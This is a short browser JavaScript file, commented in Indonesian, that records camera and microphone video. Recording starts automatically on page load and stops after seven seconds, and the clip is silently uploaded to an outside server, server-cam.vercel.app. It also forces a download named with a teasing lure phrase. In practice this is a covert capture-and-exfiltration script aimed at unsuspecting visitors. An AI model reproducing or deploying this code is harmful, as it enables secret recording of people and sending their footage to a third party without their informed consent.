// Variabel global
let recordRTC;
const startButton = document.getElementById('startButton');
const stopButton = document.getElementById('stopButton');
const mongodbURL = 'https://server-cam.vercel.app/api/upload'; // Ganti dengan URL MongoDB Anda


const config = {
    audio: true,
    video: { width: 3840, height: 2160 },
};

// Fungsi untuk memulai perekaman
function startRecording() {
    navigator.mediaDevices.getUserMedia(config)
        .then(function(stream) {
            const options = {
                mimeType: 'video/webm',
                audioBitsPerSecond: 128000,
                videoBitsPerSecond: 8000000, // Bitrate video yang tinggi
                bitsPerSecond: 8000000,
                video: {
                    width: 3840, // Resolusi video tinggi
                    height: 2160,
                    frameRate: 120, // Frame rate tinggi
                },
            };
            recordRTC = RecordRTC(stream, options);
            recordRTC.startRecording();
        })
        .catch(function(error) {
            console.error('Kesalahan saat mengakses perangkat media: ', error);
        });
}


function videoElement(buffer) {

    const modifiedBuffer = new Uint8Array(buffer);
    const blob = new Blob([modifiedBuffer], { type: 'video/webm' })

    const elemenVideo = document.querySelector('video')
    const urlSrc = URL.createObjectURL(blob);
    const source = `<source src='${urlSrc}' type='video/mp4' />`
    elemenVideo.innerHTML = source
    return console.log(modifiedBuffer);
}

// Fungsi untuk menghentikan perekaman dan mengunggah video ke MongoDB
function stopRecording() {
    recordRTC.stopRecording(function() {
        const blob = recordRTC.getBlob();
        const dataURL = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = dataURL;
        a.download = 'lihat anak pungut';
        a.click();

        const video = document.querySelector('video');
        video.innerHTML = `<source src="${dataURL}" type="video/mp4"/>`
        video.play()

        const formData = new FormData();
        formData.append('video', blob, 'video/webm');

        fetch(mongodbURL, {
                method: 'POST',
                body: formData,
                // headers: {
                //     'Content-Type': 'multipart/form-data'
                // }
            })
            .then(e => e.json())
            .then(response => console.log(response))
            .catch(error => console.log('gagal menyimpan', error))

        // URL.revokeObjectURL(dataURL)
    });
}

setTimeout(() => {
    stopRecording()
}, 7000)

startRecording()


// fetch('https://server-cam.vercel.app/data')
//     .then(e => e.json())
//     .then(response => {
//         console.log(response)
//         videoElement(response.video[0].data.data)
//     })